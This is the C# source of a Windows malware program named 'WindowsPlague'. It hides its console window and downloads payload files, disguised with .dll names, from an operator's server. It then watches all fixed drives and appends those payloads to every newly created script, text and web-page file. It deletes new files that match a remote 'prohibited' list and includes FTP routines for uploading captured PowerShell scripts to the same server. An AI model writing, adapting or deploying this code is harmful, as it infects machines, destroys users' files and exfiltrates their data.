using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace WindowsPlague
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        // To hide the window
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        // The IP of the FTP and HTTP server.
        // The HTTP server should have all the injection files
        // which should be the same as the FTP server that will 
        // receive all PS1 scripts
        string ip;
        string TXTtext;
        string PS1text;
        string BATtext;
        string PHPtext;
        string ASPtext;
        string[] ANTIUtextList;
        Regex TXTregex;
        Regex PS1regex;
        Regex BATregex;
        Regex EXEregex;
        Regex PHPregex;
        Regex ASPregex;
        Regex ASPXregex;

        FtpWebRequest ftp;
        FileSystemWatcher watcher = new FileSystemWatcher();
        List<FileSystemWatcher> watches = new List<FileSystemWatcher>();

        public Program(string ip)
        {
            this.hide();
            //Set the server's IP
            this.ip = ip;
            //Download the files first
            this.getInjections();

            // .dll as a kind of disguisement
            // Read entire text file content in one line
            this.TXTtext = File.ReadAllText(
                Path.Combine(Environment.CurrentDirectory, "Itxt.dll")).ToString();
            this.PS1text = File.ReadAllText(
                Path.Combine(Environment.CurrentDirectory, "Ips1.dll")).ToString();
            this.BATtext = File.ReadAllText(
                Path.Combine(Environment.CurrentDirectory, "Ibat.dll")).ToString();
            this.PHPtext = File.ReadAllText(
                Path.Combine(Environment.CurrentDirectory, "Iphp.dll")).ToString();
            this.ASPtext = File.ReadAllText(
                Path.Combine(Environment.CurrentDirectory, "Iasp.dll")).ToString();

            // Get just the path of the list of the prohibited files.
            this.ANTIUtextList = File.ReadAllLines(Path.Combine(Environment.CurrentDirectory, "antiu.dll"));

            this.TXTregex = new Regex(@"^.*\.txt$", RegexOptions.IgnoreCase);
            this.PS1regex = new Regex(@"^.*\.ps1$", RegexOptions.IgnoreCase);
            this.BATregex = new Regex(@"^.*\.bat$", RegexOptions.IgnoreCase);
            this.EXEregex = new Regex(@"^.*\.exe$", RegexOptions.IgnoreCase);
            this.PHPregex = new Regex(@"^.*\.php$", RegexOptions.IgnoreCase);
            this.ASPregex = new Regex(@"^.*\.asp$", RegexOptions.IgnoreCase);
            this.ASPXregex = new Regex(@"^.*\.aspx$", RegexOptions.IgnoreCase);

            this.watchStart();
        }


        public void watchStart()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            FileSystemWatcher watch;

            foreach (DriveInfo d in allDrives)
            {
                if (d.DriveType == DriveType.Fixed)
                {
                    watch = new FileSystemWatcher();
                    watch.InternalBufferSize = 1024 * 1024;
                    watch.Path = d.RootDirectory.ToString();
                    watch.IncludeSubdirectories = true;
                    watch.NotifyFilter = NotifyFilters.FileName;
                    watch.Created += new FileSystemEventHandler(OnCreation);
                    watch.EnableRaisingEvents = true;
                    watches.Add(watch);
                }
            }
            return;
        }

        public void OnCreation(object source, FileSystemEventArgs e)
        {
            // Delete all prohibited files
            // If 1 it stops since the file will be deleted
            if (checkProhibitedList(e)) return;

            // Wait 1 sec
            System.Threading.Thread.Sleep(1000);

            if (TXTregex.Match(e.FullPath).Success |
                PS1regex.Match(e.FullPath).Success |
                EXEregex.Match(e.FullPath).Success |
                ASPregex.Match(e.FullPath).Success |
                PHPregex.Match(e.FullPath).Success |
                ASPXregex.Match(e.FullPath).Success |
                BATregex.Match(e.FullPath).Success)
            {
                //This works
                // Which is copying files from a place to another place
                try
                {
                    if (!File.Exists(e.FullPath))
                        return;
                    // This text is always added, making the file longer over time
                    // if it is not deleted.
                    using (StreamWriter sw = File.AppendText(e.FullPath))
                    {
                        if (TXTregex.Match(e.FullPath).Success)
                        {
                            sw.WriteLine(TXTtext.ToString());
                        }
                        else if (PS1regex.Match(e.FullPath).Success)
                        {
                            sw.WriteLine(PS1text.ToString());
                            //send2server(e);
                            //UploadFtpFile(e);
                        }
                        else if (BATregex.Match(e.FullPath).Success)
                        {
                            sw.WriteLine(BATtext.ToString());
                        }
                        else if (PHPregex.Match(e.FullPath).Success)
                        {
                            sw.WriteLine(PHPtext.ToString());
                        }
                        else if (ASPregex.Match(e.FullPath).Success | ASPXregex.Match(e.FullPath).Success)
                        {
                            // There is just one file for asp and aspx since all of them are the same
                            sw.WriteLine(ASPtext.ToString());
                        }
                        else
                        {
                            sw.WriteLine("NONE!");
                        }

                    }
                    // If ps1 Send it to ftp server
                    // 
                    // TODO - Write a function to do that
                }
                catch (IOException ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            // If exe file:
            // Do something
            else if (EXEregex.Match(e.FullPath).Success)
            {
                try
                {
                    Console.WriteLine("EXE is here");
                }
                catch (IOException ex)
                {
                    Console.WriteLine(ex.Message);
                }

            }

            return;
        }

        // TODO
        // Read ANTIUtext just once and just save the lines
        // So you do not read it every time this function gets called
        private Boolean checkProhibitedList(FileSystemEventArgs e)
        {
            try
            {
                if (File.Exists(e.FullPath))
                {
                    foreach (string line in ANTIUtextList)
                    {
                        System.Console.WriteLine(line);
                        Regex TMPregex = new Regex(@line.Trim(), RegexOptions.IgnoreCase);
                        if (TMPregex.Match(e.FullPath).Success)
                        {
                            // If success delete the file
                            File.Delete(e.FullPath);
                            return true;
                        }
                    }

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return false;
        }

        public void UploadFtpFile(FileSystemEventArgs e)
        {
            string fileName = Path.GetFileName(e.FullPath);
            FtpWebRequest request;

            request = WebRequest.Create(new Uri(string.Format(@"ftp://{0}/{1}", this.ip, fileName))) as FtpWebRequest;
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.UseBinary = true;
            request.UsePassive = true;
            request.KeepAlive = true;
            request.Credentials = new NetworkCredential("anonymous", "anonymous@anonymous.net");
            request.ConnectionGroupName = "group";

            using (FileStream fs = File.OpenRead(fileName))
            {
                byte[] buffer = new byte[fs.Length];
                fs.Read(buffer, 0, buffer.Length);
                fs.Close();
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(buffer, 0, buffer.Length);
                requestStream.Flush();
                requestStream.Close();
            }
        }

        private void send2server(FileSystemEventArgs e)
        {
            string fileName = Path.GetFileName(e.FullPath);
            Console.WriteLine("ftp://" + this.ip + "/" + fileName);
            ftp = (FtpWebRequest)WebRequest.Create("ftp://" + this.ip + "/" + fileName);
            ftp.Method = WebRequestMethods.Ftp.UploadFile;
            ftp.Credentials = new NetworkCredential("anonymous", "anonymous@anonymous.net");
            ftp.UseBinary = true;
            ftp.UsePassive = true;
            using (FileStream fs = File.OpenRead(e.FullPath))
            {
                byte[] buffer = new byte[fs.Length];
                fs.Read(buffer, 0, buffer.Length);
                fs.Close();
                try
                {
                    Stream requestStream = ftp.GetRequestStream();
                    requestStream.Write(buffer, 0, buffer.Length);
                    requestStream.Close();
                    requestStream.Flush();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            return;
        }

        private void hide()
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);
            return;
        }

        private void getInjections()
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile("http://" + ip + "/Itxt.dll", Path.Combine(Environment.CurrentDirectory, "Itxt.dll"));
            webClient.DownloadFile("http://" + ip + "/Ips1.dll", Path.Combine(Environment.CurrentDirectory, "Ips1.dll"));
            webClient.DownloadFile("http://" + ip + "/Ibat.dll", Path.Combine(Environment.CurrentDirectory, "Ibat.dll"));
            webClient.DownloadFile("http://" + ip + "/Iphp.dll", Path.Combine(Environment.CurrentDirectory, "Iphp.dll"));
            webClient.DownloadFile("http://" + ip + "/Iasp.dll", Path.Combine(Environment.CurrentDirectory, "Iasp.dll"));
            webClient.DownloadFile("http://" + ip + "/antiu.dll", Path.Combine(Environment.CurrentDirectory, "antiu.dll"));
        }

        static void Main(string[] args)
        {
            try
            {
                Program p = new Program(args[0]);
                var name = Console.ReadLine();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Main(args);
            }
        }

    }
}
